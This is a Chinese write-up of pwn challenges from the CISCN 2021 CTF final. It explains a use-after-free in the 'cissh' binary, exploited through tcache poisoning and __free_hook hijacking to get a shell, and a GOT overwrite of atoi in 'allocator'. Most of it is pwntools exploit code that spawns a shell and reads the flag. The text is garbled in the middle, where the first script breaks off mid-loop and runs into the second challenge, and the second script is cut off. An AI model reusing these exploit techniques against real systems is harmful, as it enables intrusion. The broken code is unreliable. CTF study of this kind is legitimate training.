# CISCN 2021 Final Break环节 Pwn Writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## cissh
这道题是最简单的一道题目，比赛现场大概有十几支队伍做出来了。
出简单的题目对自己队伍其实蛮不利的，因为如果抽到了自己的题目，比赛过程中会排除自己的题目，而别人都是难题，就很容易爆零。
这是一道 C++ 程序，题目的难度主要在于逆向部分，但是由于比赛现场时间有限，所以这里推荐采用盲测 + 简单静态分析的手法来寻找漏洞。
可以找到程序中存在 Manager::initFuncTable 函数用于初始化
结合里面的字符串可以猜测到对应的传参与 Linux Shell 类似。
程序中存在 ln 操作可以软链接一个文件，但是源文件删除后 ln 后的内容仍然存在，通过盲测触发了一个 double free 报错
这意味着文件“b”还在使用文件“a”的数据指针，存在 UAF，我们可以通过
    touch a
    vi a
    ln b a
    rm a
    vi b #uaf
这样来构造出一个 UAF
有了 UAF 之后就直接填满 Tcache 后利用 unsortedbin 泄露出 libc_base，再修改 tcache 的 next 指针为
**free_hook，两次申请后得到** free_hook，劫持__free_hook 为 system，再 free(‘/bin/sh\’); 来执行
system(‘/bin/sh’); 即可。
**Exp 脚本**
    from pwn import *
    elf = None
    libc = None
    file_name = "./cissh"
    #context.timeout = 1
    def get_file(dic=""):
        context.binary = dic + file_name
        return context.binary
    def get_libc(dic=""):
        libc = None
        try:
            data = os.popen("ldd {}".format(dic + file_name)).read()
            for i in data.split('\n'):
                libc_info = i.split("=>")
                if len(libc_info) == 2:
                    if "libc" in libc_info[0]:
                        libc_path = libc_info[1].split(' (')
                        if len(libc_path) == 2:
                            libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                            return libc
        except:
            pass
        if context.arch == 'amd64':
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        elif context.arch == 'i386':
            try:
                libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
            except:
                libc = ELF("/lib32/libc.so.6", checksec=False)
        return libc
    def get_sh(Use_other_libc=False, Use_ssh=False):
        global libc
        if args['REMOTE']:
            if Use_other_libc:
                libc = ELF("./libc.so.6", checksec=False)
            if Use_ssh:
                s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
                return s.process(file_name)
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process(file_name)
    def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                    int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if libc == True:
            return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
        elif int_mode:
            return_address = int(sh.recvuntil(end_string, drop=True), 16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
        elif context.arch == 'amd64':
            return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
        else:
            return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.recvrepeat(0.1)
        sh.sendline('cat flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh, gdbscript=None, addr=0, stop=False):
        if args['REMOTE']:
            return
        if gdbscript is not None:
            gdb.attach(sh, gdbscript=gdbscript)
        elif addr is not None:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(sh.pid)).readlines()[1], 16)
            log.success("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(sh, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(sh)
        if stop:
            raw_input()
    def Attack(target=None, sh=None, elf=None, libc=None):
        if sh is None:
            from Class.Target import Target
            assert target is not None
            assert isinstance(target, Target)
            sh = target.sh
            elf = target.elf
            libc = target.libc
        assert isinstance(elf, ELF)
        assert isinstance(libc, ELF)
        try_count = 0
        while try_count  got[@atoi](https://github.com/atoi "@atoi") 用来泄露 libc，写 -> 修改
got[@atoi](https://github.com/atoi "@atoi") 为 system 来 getshell。**
**Exp 脚本**
    from pwn import *
    from Crypto.Util.number import *
    elf = None
    libc = None
    file_name = "./allocator"
    # context.timeout = 1
    def get_file(dic=""):
        context.binary = dic + file_name
        return context.binary
    def get_libc(dic=""):
        libc = None
        try:
            data = os.popen("ldd {}".format(dic + file_name)).read()
            for i in data.split('\n'):
                libc_info = i.split("=>")